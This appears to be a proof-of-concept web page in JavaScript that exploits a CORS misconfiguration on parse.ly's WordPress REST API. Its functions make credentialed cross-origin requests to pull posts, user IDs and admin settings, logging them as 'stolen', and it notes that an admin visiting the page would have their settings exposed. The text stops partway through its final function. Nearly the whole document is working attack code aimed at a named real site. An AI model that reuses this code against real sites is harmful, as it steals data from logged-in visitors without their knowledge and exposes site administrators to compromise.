<div id="output"></div>

<script>
const output = document.getElementById('output');

function log(msg, isError = false) {
  const div = document.createElement('div');
  div.className = 'result' + (isError ? ' error' : '');
  div.textContent = typeof msg === 'object' ? JSON.stringify(msg, null, 2) : msg;
  output.appendChild(div);
}

async function fetchParseLy(url) {
  try {
    const resp = await fetch(url, { credentials: 'include' });
    const data = await resp.json();
    return data;
  } catch(e) {
    return null;
  }
}

async function stealPosts() {
  log('Fetching posts from parse.ly REST API...');
  const posts = await fetchParseLy('https://www.parse.ly/wp-json/wp/v2/posts?per_page=5');
  if (posts && Array.isArray(posts)) {
    log(`SUCCESS! Stole ${posts.length} posts:`);
    posts.forEach(p => {
      log(`- [ID:${p.id}] "${p.title.rendered}" by author ${p.author}`);
      log(`  Link: ${p.link}`);
      log(`  Modified: ${p.modified}`);
      if (p.parsely && p.parsely.meta) {
        log(`  Internal Parsely metadata exposed: ${JSON.stringify(p.parsely.meta).substring(0, 200)}...`);
      }
    });
  } else {
    log('Failed to fetch posts', true);
  }
}

async function stealUsers() {
  log('Fetching user IDs from parse.ly REST API...');
  const users = await fetchParseLy('https://www.parse.ly/wp-json/wp/v2/users?per_page=10');
  if (users && Array.isArray(users)) {
    log(`SUCCESS! Stole ${users.length} user IDs:`);
    users.forEach(u => {
      log(`- [ID:${u.id}] ${u.name} (${u.slug})`);
    });
  } else {
    log('Users endpoint may require auth, but CORS headers still allow the request attempt', true);
  }
}

async function stealSettings() {
  log('Attempting to steal WordPress settings (requires authenticated victim)...');
  const settings = await fetchParseLy('https://www.parse.ly/wp-json/wp/v2/settings');
  if (settings) {
    if (settings.code === 'rest_forbidden') {
      log('Settings require auth - BUT if you are seeing this message, the CORS request was allowed!');
      log('If a parse.ly admin visited this page, their settings would be exposed.');
    } else {
      log('SUCCESS! Stolen settings:');
      log(settings);
    }
  }
}

async function stealAll() {
  await stealPosts();
  await stealUsers();
  await stealSettings();
